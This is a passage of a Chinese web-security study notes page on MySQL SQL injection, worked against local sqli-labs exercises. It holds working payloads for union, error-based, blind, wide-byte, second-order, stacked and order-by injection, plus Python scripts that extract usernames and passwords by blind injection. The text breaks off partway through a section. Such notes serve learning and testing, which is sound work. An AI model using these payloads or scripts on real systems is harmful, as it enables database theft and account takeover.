+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    布尔盲注
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    时间盲注
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    约束攻击
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    利用方法
+  </a>
+  
+    <nav class="md-nav" aria-label="利用方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#information_schema" class="md-nav__link">
+    information_schema套路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#into-oufileshell" class="md-nav__link">
+    into oufile写shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#load_file" class="md-nav__link">
+    load_file读文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mysql-dnslog" class="md-nav__link">
+    MySQL DNSlog盲打
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    过滤绕过
+  </a>
+  
+    <nav class="md-nav" aria-label="过滤绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    过滤了空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_2" class="md-nav__link">
+    区分大小写过滤了SQL关键词
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql_3" class="md-nav__link">
+    不区分大小写过滤了SQL关键词
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    过滤了引号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    过滤了逗号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    过滤了比较符&lt; &gt;
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#or-and-xor-not" class="md-nav__link">
+    过滤了 or and xor not
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    过滤了注释符
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    过滤了=
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    HTTP参数污染绕过
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/f1rstb100d/f1rstb100d.github.io/edit/master/docs/Web安全/SQL注入/sql注入.md" title="编辑此页" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<h2 id="sql_1">Sql基础<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h2>
+<p>mysql内置的information_schema数据库中有三个表非常重要</p>
+<ol>
+<li>schemata:表里包含所有数据库的名字</li>
+<li>tables：表里包含所有数据库的所有的表，默认字段为table_name</li>
+<li>columns:三个列非常重要</li>
+<li>TABLE_SCHEMA：数据库名</li>
+<li>TABLE_NAME:表名</li>
+<li>COLUMN_NAME:字段名</li>
+</ol>
+<p>PHP的包含文件函数有两个，分别是**include**和**require**。</p>
+<ul>
+<li>require生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li>
+<li>include生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li>
+</ul>
+<p>@是可以**屏蔽**函数执行过程中遇到问题而产生的一些错误、<strong>警告信息</strong>，这样用户就看不到程序的出错信息。这样除了用户界面会友好一些外，更重要的是安全性，因为屏蔽了**出错文件的路径**等信息。我们的目的是用户不应该看到后端任何其他信息。</p>
+<p>die() 函数输出一条消息，并退出当前脚本。</p>
+<p>拼接sql</p>
+<div class="highlight"><pre><span></span><code><span class="x">$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</span>
+</code></pre></div>
+<p>我们判断是否有注入点一般是通过三个方面，如果满足以下三点，基本可以断定存在注入点</p>
+<ol>
+<li>
+<p>id=1' 加单引号报错，这里的单引号，是泛指，泛指特殊符号，因为SQL隐式转换的原因，一般是加闭合符号使其报错</p>
+</li>
+<li>
+<p>id=1 and 1=1 返回正确结果，这里1=1也是泛指，泛指加入true的查询语句会不会执行</p>
+</li>
+<li>
+<p>id=1 and 1=2 返回错误，这里1=2也是泛指，泛指加入false的查询语句会不会执行</p>
+</li>
+</ol>
+<p>MySQL的<code>隐式转换</code>：</p>
+<ul>
+<li>若字符串是以数字开头，并且全部都是数字，则转换的数字结果是整个字符串；部分是数字，则转换的数字结果是截止到第一个不是数字的字符为止</li>
+<li>若字符串不是以数字开头，则转换的数字结果是 0</li>
+</ul>
+<p>id字段是int类型，在做where判断时 <code>1 and 1=1</code> 与 <code>1 and 1=2</code> 均被转换为数字 <code>1</code> 了，所以才会显示正确页面</p>
+<p>MySQL的**布尔类型**转换<code>隐式转换</code>：</p>
+<ul>
+<li>当运算符，函数或者流程控制结构需要一个 boolean 参数时，该值会被<code>自动转换</code></li>
+<li><code>≥1</code>的数值会被转换成<code>TRUE</code></li>
+<li><code>0或其他非数字开头字符串</code>会被转换成<code>FALSE</code></li>
+</ul>
+<p>就像第一关的<code>'2a'</code>先是隐式转换 为 <code>数字2</code>，然后因为与布尔类型运算，又被转换为<code>TRUE</code></p>
+<p>后面的就跟前面的流程一样，只是闭合是 <code>')</code></p>
+<p><code>preg_replace</code><strong>正则匹配修饰符</strong>：</p>
+<ul>
+<li>i：搜索时不区分大小写：A和a没有区别</li>
+<li>g：搜索时会查找所有的匹配项,如果没有标志 g，则正则表达式仅查找第一个匹配项</li>
+<li>m：多行模式，这仅仅会影响<code>^</code>和<code>$</code>锚符的行为，不仅仅匹配文本的开始与结束，还匹配每一行的开始与结束。 <code>^</code>匹配文本开头，<code>$</code>匹配文本末尾</li>
+<li>s：启用 “dotall” 模式，允许点 . 匹配换行符 \n（默认情况下，点与换行符 \n 不匹配）</li>
+</ul>
+<h2 id="_1">分类<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="_2">基于注入位置<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li>GET型</li>
+<li>POST型</li>
+<li>User-Agent型</li>
+<li>Referer型</li>
+<li>Cookie型</li>
+</ul>
+<h3 id="_3">基于闭合方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li>'</li>
+<li>)</li>
+<li>"</li>
+<li>")</li>
+<li>')</li>
+<li>
+<p>'))</p>
+</li>
+<li>
+<p>"))</p>
+</li>
+<li>数值型无需闭合</li>
+</ul>
+<h3 id="_4">基于注入语句类型<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li>select语句</li>
+<li>update语句</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="x">$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</span>
+</code></pre></div>
+<p>在更新passwd中可以注入</p>
+<div class="highlight"><pre><span></span><code><span class="x">uname=admin&amp;passwd=&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#&amp;submit=Submit</span>
+<span class="x">uname=admin&amp;passwd=&#39; and extractvalue(null,concat(0x7e,database(),0x7e))#&amp;submit=Submit</span>
+</code></pre></div>
+<ul>
+<li>insert语句</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="x">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span>
+</code></pre></div>
+<p>insert类型的注入也是需要配合报错函数updatexml()、extractvalue()、floor()回显信息，保证闭合即可，不过此处的注入点在uagent内</p>
+<div class="highlight"><pre><span></span><code><span class="x">User-Agent: &#39;,1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))#</span>
+<span class="x">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;&#39;,1,updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password) from users limit 0,1)),1))#&#39;, &#39;127.0.0.1&#39;, 1)</span>
+</code></pre></div>
+<h2 id="_5">注入方法总结<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h3 id="_6">联合查询<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>测试发现是单引号闭合</p>
+<div class="highlight"><pre><span></span><code><span class="x">$sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</span>
+</code></pre></div>
+<p>直接上联合查询</p>
+<div class="highlight"><pre><span></span><code><span class="x">?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 爆表名</span>
+
+<span class="x">?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;8fof1zun81&#39;--+  爆列名</span>
+
+<span class="x">?id=-1&#39; union select 1,group_concat(secret_31F4),3 from 8fof1zun81--+  获取key值</span>
+</code></pre></div>
+<h3 id="_7">报错注入<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>以php为例，需要源码代码异常处理中存在打印错误的方法<code>print_r(mysqli_error($con1));</code>，才能利用报错注入回显错误结果</p>
+<h4 id="updatexml">updatexml()<a class="headerlink" href="#updatexml" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">UPDATEXML(XML_document,XPath_string,new_value);</span>
+</code></pre></div>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称。
+第二个参数：XPath_string（Xpath格式的字符串）
+第三个参数：new_value,String格式，替换查找到的符合条件的数据</p>
+<p>通俗的将就是找到数据替换数据，第一个参数和第三个参数我们是用不到的，用到的是第二个参数，且是他的报错返回值。</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,version()),0) -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and updatexml(1,concat(0x7e,version()),0) -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p>如果不加concat()的话报错回显结果不全</p>
+<p>payload：</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),10) -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,username,password))from users),0x7e),1) -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p>显示不全
+可以逐行输出</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and updatexml(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1)),0) -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<h4 id="extractvalue">extractvalue()<a class="headerlink" href="#extractvalue" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">ExtractValue（xml_document,xpath_string）</span>
+</code></pre></div>
+<p>从目标XML中返回包含所查询的字符串</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象名称，文中为Doc
+第二个参数：XPath_string（Xpath格式的字符串）</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(0x7e,username,password)from users limit 0,1))) -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<h4 id="floor">floor()<a class="headerlink" href="#floor" title="Permanent link">&para;</a></h4>
+<p>最终payload：</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-5/?id=1&#39; and (SELECT 1 from(select count(*),CONCAT(DATABASE(),floor(rand(0)*2))x from users group by x)a)-- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and (select 1 from (select count(*) ,concat(database(),floor(rand(0)*2))x from users group by x)a) -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<p>rand()产生0到1的随机数，<code>rand(0)</code> 内的<code>0</code>是种子，固定种子产生的随机数都是一样的</p>
+<p><code>floor()</code> 函数返回小于或等于x的最大整数</p>
+<p><code>floor(rand(0)*2)</code>函数就是将0到1的随机数乘以2之后再向下取整</p>
+<p>因为种子固定，所以生成的序列也是固定的011011…</p>
+<p><code>concat(database(),floor(rand(0)*2))x</code> 这里是将<code>concat(database(),floor(rand(0)*2))</code> 叫为<code>x</code>，就是起个别名</p>
+<p>group by key在执行时循环读取数据的每一行，将结果保存于**临时表**中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据<code>（更新时，不再计算rand值）</code>；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>（插入数据时，会再计算rand值）</code></p>
+<p>由于floor(rand(0)*2)的计算结果01101100…，导致临时表插入新行时主键冲突</p>
+<p>就会爆出<code>Duplicate entry 'security1' for key &lt;group_key&gt;</code></p>
+<p><code>and (select 1 from</code>必须加，否则报出<code>Operand should contain 1 column（操作数应包含1列）</code>，因为and后面的语句生成的是一个<code>虚表</code>，而我们需要的是一个布尔值，所以我们需要将and后面查询改为布尔值。</p>
+<h3 id="_8">布尔盲注<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p><code>'</code>闭合的布尔型盲注</p>
+<div class="highlight"><pre><span></span><code><span class="x">http://localhost/sqli/Less-8/?id=1&#39; and ascii(substr(database(),1,1))=115 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;1&#39; and ascii(substr(database(),1,1))=115 -- -&#39; LIMIT 0,1</span>
+<span class="x">回显正常页面说明and后面为true</span>
+
+<span class="x">?id=1&#39;) and length((select database()))=10--+  布尔盲注</span>
+</code></pre></div>
+<p><code>substr(database(),1,1)</code>意思是截取数据库名，从第一个字符开始截取一个字符<code>'s'</code></p>
+<p><code>ascii()</code>是将字符转换为<code>ASCII码</code>，<code>'s'</code> 对应的ASCII码是<code>115</code></p>
+<p><code>length()</code> 函数，返回字符串的长度</p>
+<p><code>left()</code> 函数，返回从左至右截取固定长度的字符串</p>
+<p>然后可以直接上脚本或者sqlmap了</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">arlist</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+<span class="n">Baseurl</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/sqlilabs2/Less-8/index.php?id=1&#39; and &quot;</span>
+
+<span class="k">def</span> <span class="nf">checkurl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s1">&#39;You are in&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">flag</span>  <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arlist</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;substr((select group_concat(username,password) from users),</span><span class="si">%s</span><span class="s2">,1) = </span><span class="se">\&#39;</span><span class="si">%s</span><span class="se">\&#39;</span><span class="s2">--+&quot;</span> <span class="o">%</span> <span class="p">(</span>
+                <span class="n">g</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+            <span class="n">finalurl</span> <span class="o">=</span> <span class="n">Baseurl</span> <span class="o">+</span> <span class="n">payload</span>
+            <span class="k">if</span> <span class="n">checkurl</span><span class="p">(</span><span class="n">finalurl</span><span class="p">):</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+
+<span class="k">if</span>  <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_9">时间盲注<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>不管是正确与否，页面都显示一样的内容，只能通过延时来观察是否执行了sql语句</p>
+<div class="highlight"><pre><span></span><code><span class="x">?id=1&#39;) and if(length((select database()))=10,sleep(5),1)--+  时间注入，如果出现延迟表示该数据库名长度是10 </span>
+</code></pre></div>
+<p>然后就是上脚本或者sqlmap了</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">arlist</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+<span class="n">Baseurl</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/sqlilabs2/Less-9/index.php?id=1&#39; and &quot;</span>
+
+<span class="k">def</span> <span class="nf">checkurl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">#如果执行了sleep这里会超时产生异常</span>
+        <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">flag</span>  <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arlist</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;if((substr((select group_concat(username,password) from users),</span><span class="si">%s</span><span class="s2">,1) = </span><span class="se">\&#39;</span><span class="si">%s</span><span class="se">\&#39;</span><span class="s2">),sleep(5),1)--+&quot;</span> <span class="o">%</span> <span class="p">(</span>
+                <span class="n">g</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+            <span class="n">finalurl</span> <span class="o">=</span> <span class="n">Baseurl</span> <span class="o">+</span> <span class="n">payload</span>
+            <span class="k">if</span> <span class="n">checkurl</span><span class="p">(</span><span class="n">finalurl</span><span class="p">):</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+
+<span class="k">if</span>  <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+<h4 id="sleep">sleep()<a class="headerlink" href="#sleep" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">sleep(N)</span>
+</code></pre></div>
+<p>N为数值，单位是秒，加上此值，查询语句会等待N秒执行</p>
+<div class="highlight"><pre><span></span><code><span class="x">1&#39; and if((substr(database(),1,1))=&#39;s&#39;,sleep(5),null)</span>
+</code></pre></div>
+<h4 id="benchmark">benchmark()<a class="headerlink" href="#benchmark" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">benchmark(count,expr)</span>
+</code></pre></div>
+<p>count:运行次数</p>
+<p>expr:运行的命令</p>
+<h4 id="_10">笛卡尔积<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>information_schema数据库中的tables表是整个MySQL数据库表名的汇总。columns表是整个MySQL数据库列的汇总。</p>
+<p>可以利用information_schema.tables和information_schema.columns来进行笛卡尔算积，造成大负荷查询，以至于达到延时的效果。</p>
+<div class="highlight"><pre><span></span><code><span class="x">select * from users where id=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);</span>
+<span class="x">0.44 sec</span>
+
+<span class="x">select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.columns B);</span>
+<span class="x">0.11 sec</span>
+
+<span class="x">select * from users where id=1 and (SELECT count(*) FROM information_schema.tables A, information_schema.tables B);</span>
+<span class="x">0.02 sec</span>
+</code></pre></div>
+<p>配合查询语句一起，如果要查询的结果为真，则会造成延时并显示数据。如果要查询的结果为假，则不会产生延时并且不会显示数据</p>
+<div class="highlight"><pre><span></span><code><span class="x">select*from users where id=1 and (ascii(substr(database(),1,1))&gt;100) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);</span>
+</code></pre></div>
+<h4 id="get_lock">GET_LOCK()<a class="headerlink" href="#get_lock" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">get_lock(str,timeout)</span>
+</code></pre></div>
+<p>对一个字符上锁,在新回话开启后,再次使用这个字符会有延时</p>
+<h4 id="rlike-regexp">RLIKE REGEXP正则匹配<a class="headerlink" href="#rlike-regexp" title="Permanent link">&para;</a></h4>
+<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
+<div class="highlight"><pre><span></span><code><span class="x">select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span>
+</code></pre></div>
+<h3 id="_11">宽字节注入<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>存在使用<code>preg_replace()</code>、<code>addslashes()</code>、<code>mysqli_real_escape_string()</code>、<code>get_magic_quotes_gpc()</code>等函数加入<code>\</code>转义，并且编码设置为gbk，可以考虑是否存在宽字节注入</p>
+<blockquote>
+<p><code>preg_replace()</code>函数需要自定义转义替换哪些字符</p>
+<p><code>addslashes()</code>函数返回在预定义的字符（单引号（'）、 双引号（"）、 反斜杠（\）、 NULL）前添加反斜杠的字符串</p>
+<p><code>mysqli_real_escape_string()</code>函数转义在 SQL 语句中使用的字符串中的特殊字符。(编码的字符是 NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z)</p>
+<p><code>get_magic_quotes_gpc()</code>将post、get、cookie过来的数据增加转义字符<code>\</code>，过滤的数据有单引号(')、双引号(")、反斜杠()与NULL(NULL字符)</p>
+</blockquote>
+<p>此编码格式<code>两个字节</code>代表<code>一个汉字</code></p>
+<p>我们输入单引号<code>'</code>，后端添加转义符号，<code>\</code>的GBK16进制编码为<code>%5c</code>，<code>'</code>的GBK16进制编码为<code>%27</code>，这是正常转义流程</p>
+<p>但是我们前端传值为<code>%df'</code>，拼接上转义的编码<code>%df%5c</code>是繁体字<code>運</code>，我们用这种方法来与<code>\</code>拼成新的字符，以此来绕过后端转义</p>
+<p>所以我们可以构造payload</p>
+<div class="highlight"><pre><span></span><code><span class="x">-1%df&#39; union select 1,2,3 -- -</span>
+<span class="x">SELECT * FROM users WHERE id=&#39;-1運&#39; union select 1,2,3 -- -&#39; LIMIT 0,1</span>
+</code></pre></div>
+<h3 id="_12">二次注入<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>注册时特殊构造用户名写入数据库，再利用update重置时没有转义造成sql拼接注入</p>
+</blockquote>
+<p>可输入参数的地方：（登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义）</p>
+<ol>
+<li>登录输入【用户名】【密码】</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</span>
+</code></pre></div>
+<ol>
+<li>修改密码输入【现密码】【新密码】【重复新密码】</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; </span>
+</code></pre></div>
+<ol>
+<li>注册输入【用户名】【密码】</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">insert into users (username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)</span>
+</code></pre></div>
+<p>我们只需要注册个账号叫</p>
+<div class="highlight"><pre><span></span><code><span class="x">账号：admin&#39;#</span>
+<span class="x">密码：123</span>
+</code></pre></div>
+<p>登录后修改密码</p>
+<div class="highlight"><pre><span></span><code><span class="x">new password：abc</span>
+<span class="x">retype password：abc</span>
+</code></pre></div>
+<p>构造成的查询语句</p>
+<div class="highlight"><pre><span></span><code><span class="x">UPDATE users SET PASSWORD=&#39;abc&#39; where username=&#39;admin&#39;#&#39; and password=&#39;123&#39; </span>
+</code></pre></div>
+<p>admin的密码即被重置为abc了</p>
+<h3 id="_13">堆叠注入<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><code>mysqli_multi_query()</code>函数执行一个或多个针对数据库的查询。区别于`mysqli_query()``</p>
+<p><code>mysqli_store_result</code> 转移上一次查询返回的结果集</p>
+<p><code>mysqli_fetch_row()</code>函数从结果集中取得一行，并作为枚举数组返回</p>
+<p><code>mysqli_more_results()</code>函数检查一个多查询是否有更多的结果。</p>
+</blockquote>
+<p>关键点就在这个<code>mysqli_multi_query()</code>函数，这个函数可以执行多条SQL语句，以至于我们可以<code>堆叠注入</code>，输入多条查询语句（以<code>;</code>为间隔符）</p>
+<p><code>堆叠注入怎么测?</code> 闭合后加个<code>;</code>不报错，应该就是可以堆叠注入</p>
+<div class="highlight"><pre><span></span><code><span class="x">1&#39;;insert into users(id,username,password) values (&#39;20&#39;,&#39;123&#39;,&#39;123&#39;)-- -</span>
+</code></pre></div>
+<h3 id="order-by">order by注入<a class="headerlink" href="#order-by" title="Permanent link">&para;</a></h3>
+<h4 id="_14">数字型注入<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">$sql=&quot;SELECT * FROM users ORDER BY $id&quot;;</span>
+</code></pre></div>
+<p>sql语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用updatexml进行报错</p>
+<p>因为<code>报错函数显示字符位数有限，最长是32位</code>，我们有两种方法</p>
+<ul>
+<li>limit逐行输出</li>
+<li>substr截取字符串(截取时候把握在32位以内)</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="x">?sort=1 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),30,30)),0)</span>
+<span class="x">//XPATH syntax error: &#39;~mysql,omg,performance_schema,s&#39;</span>
+</code></pre></div>
+<h4 id="_15">字符型注入<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="x">$sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</span>
+</code></pre></div>
+<p>order by后面跟**数字**或**字段名**，单引号闭合的只能跟字段名了</p>
+<p>若填写其他字符，则默认按第一列排序</p>
+<div class="highlight"><pre><span></span><code><span class="x">?sort=1&#39; and updatexml(1,concat(0x7e,substr((select group_concat(username,&#39;~&#39;,password) from users),1,30)),0) and &#39;1</span>
+<span class="x">//XPATH syntax error: &#39;~Dumb~Dumb,Angelina~I-kill-you,&#39;</span>
+</code></pre></div>
+<h4 id="_16">布尔盲注<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<p>不回显报错信息的话，针对数字型sql语句只能使用**order by rand()布尔盲注：**</p>
